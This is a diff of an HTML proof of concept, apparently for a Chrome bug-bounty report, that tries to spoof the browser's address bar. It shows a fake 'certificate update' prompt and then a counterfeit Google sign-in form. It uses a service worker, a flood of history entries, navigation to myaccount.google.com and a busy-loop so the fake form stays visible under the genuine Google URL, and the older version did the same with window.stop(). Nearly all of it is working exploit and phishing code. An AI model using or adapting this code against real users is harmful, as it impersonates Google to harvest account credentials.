@@ -1,55 +1,76 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Chrome VRP Research</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chrome VRP PoC</title>
     <style>
-        body { font-family: sans-serif; text-align: center; padding: 50px 20px; background: white; }
-        .fake-login { 
-            border: 1px solid #dadce0; padding: 20px; border-radius: 8px; 
-            max-width: 400px; margin: 0 auto; box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-        }
-        .btn { background: #1a73e8; color: white; border: none; padding: 15px 30px; border-radius: 4px; width: 100%; font-size: 16px; margin-top: 10px; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
+        body { font-family: -apple-system, sans-serif; text-align: center; padding: 40px 20px; background: #f8f9fa; }
+        .card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); max-width: 400px; margin: 0 auto; }
+        .btn { background: #1a73e8; color: white; border: none; padding: 15px 30px; border-radius: 4px; font-size: 16px; width: 100%; cursor: pointer; opacity: 0.5; pointer-events: none; }
+        .btn.ready { opacity: 1; pointer-events: auto; }
+        .hidden { display: none; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; }
+        #status { color: #5f6368; font-size: 14px; margin-bottom: 20px; }
     </style>
 </head>
 <body>
 
-    <div id="content">
-        <h2>Session Expired</h2>
-        <p>Your Google session has timed out. Please sign in again.</p>
-        
-        <div class="fake-login">
-            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="92">
-            <h3>Sign in</h3>
-            <input type="email" placeholder="Email or phone">
-            <input type="password" placeholder="Enter your password">
-            <button class="btn" onclick="triggerSpoof()">Sign In</button>
-        </div>
+<div class="card">
+    <div id="status">⏳ Initializing security hooks...</div>
+
+    <div id="setup-ui">
+        <h2>Update Required</h2>
+        <p>Your browser requires a security certificate update to continue.</p>
+        <button id="main-btn" class="btn" onclick="executeExploit()">Update Now</button>
     </div>
 
-    <script>
-        function triggerSpoof() {
-            // 1. We navigate to a high-value domain but on a 'blocked' port (like 9999)
-            // Chrome will update the URL bar to the domain immediately.
-            const target = "https://myaccount.google.com:9999/";
-            
-            // 2. We use the Navigation API to 'intercept' the failure
-            // This prevents Chrome from showing the 'Site can't be reached' error page
-            if (window.navigation) {
-                navigation.navigate(target);
-                
-                // 3. Immediately after the URL bar updates, we 'cancel' the error transition
-                // so our fake UI stays on the screen.
-                setTimeout(() => {
-                    window.stop(); 
-                    console.log("Navigation stalled. Check URL bar.");
-                }, 100);
-            } else {
-                // Fallback for older versions
-                window.location.href = target;
-            }
+    <div id="spoof-ui" class="hidden">
+        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="92" alt="Google">
+        <h3>Sign in</h3>
+        <p>Use your Google Account</p>
+        <input type="email" placeholder="Email or phone">
+        <input type="password" placeholder="Enter your password">
+        <button class="btn ready">Next</button>
+    </div>
+</div>
+
+<script>
+    // 1. Register the Service Worker and wait for it to be active
+    if ('serviceWorker' in navigator) {
+        navigator.serviceWorker.register('sw.js').then(reg => {
+            return navigator.serviceWorker.ready;
+        }).then(() => {
+            const btn = document.getElementById('main-btn');
+            btn.classList.add('ready');
+            document.getElementById('status').innerText = "✅ Exploit Ready (Tap 'Update Now')";
+        });
+    }
+
+    function executeExploit() {
+        // 2. Immediate UI swap to our fake content
+        document.getElementById('setup-ui').classList.add('hidden');
+        document.getElementById('spoof-ui').classList.remove('hidden');
+        document.body.style.background = "white";
+
+        // 3. THE HISTORY HAMMER: Flood the history stack to lag the Browser Process
+        for (let i = 0; i < 400; i++) {
+            history.pushState({state: i}, "", "#setup-step-" + i);
         }
-    </script>
+
+        // 4. TRIGGER NAVIGATION: Points to the real Google target
+        // The Service Worker will catch this and 'hang' the connection
+        const target = "https://myaccount.google.com/?authuser=0&exploit=true";
+        window.location.href = target;
+
+        // 5. THE RENDERER STALL: Busy-loop to keep the screen from clearing
+        const stallTime = 2500; // 2.5 seconds
+        const start = Date.now();
+        while (Date.now() - start < stallTime) {
+            // Processing...
+        }
+    }
+</script>
+
 </body>
 </html>
